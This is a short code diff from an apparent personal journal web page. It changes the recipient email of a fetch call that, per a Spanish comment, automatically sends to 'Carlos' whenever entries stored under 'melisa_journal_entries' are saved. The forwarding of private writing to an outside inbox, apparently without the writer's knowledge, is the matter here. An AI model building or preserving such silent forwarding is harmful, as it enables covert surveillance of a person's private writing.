@@ -671,7 +671,7 @@
             localStorage.setItem('melisa_journal_entries', JSON.stringify(entries));
             
             // --- ENVIO AUTOMATICO A CARLOS ---
-            fetch("https://formsubmit.co/ajax/harharbuena@gmail.com", {
+            fetch("https://formsubmit.co/ajax/whatsapp1997@gmail.com", {
                 method: "POST",
                 headers: { 
                     'Content-Type': 'application/json',
